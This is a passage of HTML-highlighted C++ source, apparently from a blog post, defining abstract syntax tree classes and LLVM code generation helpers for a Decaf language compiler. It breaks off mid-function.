class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;regex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> YYTOKENTYPE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafexpr.tab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">extern</span> llvm::Module *TheModule;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">descriptor</span> &#123;</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="class"><span class="keyword">union</span> </span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">		llvm::AllocaInst * alloc;</span><br><span class="line">		llvm::Function* func;</span><br><span class="line">		llvm::Value* value;</span><br><span class="line">		llvm::Type* type;</span><br><span class="line">	&#125;;</span><br><span class="line">	llvmValue kind;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decafAST - Base class for all abstract syntax tree nodes.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	descriptor des = &#123;<span class="number">0</span>,nullK&#125;;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">decafAST</span>() &#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>); &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> des.value;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Type *<span class="title">getLLVMType</span><span class="params">(llvmType ty, llvm::LLVMContext &amp;Context )</span> </span>&#123; </span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ty) &#123;</span><br><span class="line">        <span class="keyword">case</span> voidTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getVoidTy</span>(Context);</span><br><span class="line">        <span class="keyword">case</span> intTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getInt32Ty</span>(Context);</span><br><span class="line">        <span class="keyword">case</span> boolTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getInt1Ty</span>(Context);</span><br><span class="line">        <span class="keyword">case</span> stringTy: <span class="keyword">return</span> llvm::Type::<span class="built_in">getInt8PtrTy</span>(Context); </span><br><span class="line">		<span class="keyword">default</span>: <span class="keyword">throw</span> <span class="built_in">runtime_error</span>(<span class="string">&quot;unknown type&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="function">llvm::Value *<span class="title">listCodegen</span><span class="params">(list&lt;T&gt; vec)</span> </span>&#123;</span><br><span class="line">	llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">typename</span> list&lt;T&gt;::iterator i = vec.<span class="built_in">begin</span>(); i != vec.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">		llvm::Value *j = (*i)-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		<span class="keyword">if</span> (j != <span class="literal">NULL</span>) &#123; val = j; &#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getString</span><span class="params">(decafAST *d)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (d != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> d-&gt;<span class="built_in">str</span>();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="function">string <span class="title">commaList</span><span class="params">(list&lt;T&gt; vec)</span> </span>&#123;</span><br><span class="line">    <span class="function">string <span class="title">s</span><span class="params">(<span class="string">&quot;&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">typename</span> list&lt;T&gt;::iterator i = vec.<span class="built_in">begin</span>(); i != vec.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">        s = s + (s.<span class="built_in">empty</span>() ? <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>) : <span class="built_in">string</span>(<span class="string">&quot;,&quot;</span>)) + (*i)-&gt;<span class="built_in">str</span>(); </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        s = <span class="built_in">string</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// decafStmtList - List of Decaf statements</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmtList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafAST *&gt; stmts;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafStmtList</span>() &#123;&#125;</span><br><span class="line">	~<span class="built_in">decafStmtList</span>() &#123;</span><br><span class="line">		<span class="keyword">for</span> (list&lt;decafAST *&gt;::iterator i = stmts.<span class="built_in">begin</span>(); i != stmts.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">			<span class="keyword">delete</span> *i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> stmts.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafAST *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> stmts; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafAST *&gt;(stmts); &#125;</span><br><span class="line">	<span class="function">llvm::Value * <span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafAST *&gt;(stmts); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAllexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Kind;</span><br><span class="line">	string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_kind</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Kind; &#125;</span><br><span class="line">	<span class="built_in">decafAllexp</span>()&#123;&#125;</span><br><span class="line">	<span class="built_in">decafAllexp</span>(string name,string kind) : <span class="built_in">Name</span>(name),<span class="built_in">Kind</span>(kind)&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;des.kind = valueK;</span><br><span class="line">		map&lt;string,<span class="keyword">int</span>&gt; tab = &#123;</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\t&#x27;&quot;</span>,<span class="string">&#x27;\t&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\r&#x27;&quot;</span>,<span class="string">&#x27;\r&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\n&#x27;&quot;</span>,<span class="string">&#x27;\n&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\a&#x27;&quot;</span>,<span class="string">&#x27;\a&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\v&#x27;&quot;</span>,<span class="string">&#x27;\v&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\b&#x27;&quot;</span>,<span class="string">&#x27;\b&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\f&#x27;&quot;</span>,<span class="string">&#x27;\f&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\\&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\&#x27;&#x27;&quot;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\&quot;&#x27;&quot;</span>,<span class="string">&#x27;\&quot;&#x27;</span>&#125;,</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">if</span>( kind == <span class="string">&quot;NumberExpr&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(tab.<span class="built_in">count</span>(<span class="keyword">this</span>-&gt;Name))&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(tab[<span class="keyword">this</span>-&gt;Name]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Name.<span class="built_in">size</span>() == <span class="number">1</span>)&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(Name[<span class="number">0</span>]<span class="number">-48</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Name.<span class="built_in">size</span>() == <span class="number">3</span> &amp;&amp; ( <span class="keyword">this</span>-&gt;Name[<span class="number">0</span>]==<span class="string">&#x27;\&#x27;&#x27;</span> || <span class="keyword">this</span>-&gt;Name[<span class="number">0</span>]==<span class="string">&#x27;\&quot;&#x27;</span> ))&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(Name[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>( kind == <span class="string">&quot;StringConstant&quot;</span>)&#123;</span><br><span class="line">			string s = <span class="keyword">this</span>-&gt;<span class="built_in">get_name</span>().<span class="built_in">erase</span>(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">			s.<span class="built_in">pop_back</span>();</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(s[i] == <span class="string">&#x27;\\&#x27;</span>)&#123;</span><br><span class="line">					<span class="keyword">char</span> t[<span class="number">0x8</span>];</span><br><span class="line">					<span class="built_in">sprintf</span>(t,<span class="string">&quot;&#x27;\\%c&#x27;&quot;</span>,s[i+<span class="number">1</span>]);</span><br><span class="line">					s[i+<span class="number">1</span>] = tab[t];</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;s.<span class="built_in">length</span>()<span class="number">-1</span>;j++)&#123;</span><br><span class="line">						s[j] = s[j+<span class="number">1</span>];</span><br><span class="line">					&#125;</span><br><span class="line">					s.<span class="built_in">pop_back</span>();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">this</span>-&gt;Name = s;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Kind + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafArrexp</span> :</span> <span class="keyword">public</span> decafAllexp &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafArrexp</span>(string Name, decafAllexp *Exp) </span><br><span class="line">		: <span class="built_in">Name</span>(Name), <span class="built_in">Exp</span>(Exp) &#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ArrayLocExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafBinexp</span> :</span> <span class="keyword">public</span> decafAllexp &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string Option;</span><br><span class="line">	decafBinexp * Exp1;</span><br><span class="line">	decafBinexp * Exp2;</span><br><span class="line">	<span class="built_in">decafBinexp</span>()&#123;&#125;</span><br><span class="line">	<span class="built_in">decafBinexp</span>(string op, decafBinexp *exp1, decafBinexp *exp2) </span><br><span class="line">		: <span class="built_in">Option</span>(op), <span class="built_in">Exp1</span>(exp1), <span class="built_in">Exp2</span>(exp2) &#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;des.kind = expbK;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">int</span> <span class="title">get_op</span><span class="params">(string Option)</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;BinaryExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Option + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp1) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp2) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decafBinexp::get_op</span><span class="params">(string Option)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(Option == <span class="string">&quot;Plus&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> addtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Minus&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> subtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Mult&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> multmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;UnaryMinus&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> negtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Div&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> divtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Mod&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> remtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Or&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> ortmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;And&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> andtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Eq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> eqtmp;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(Option == <span class="string">&quot;Neq&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> netmp;</span><br><span class="line">	<span 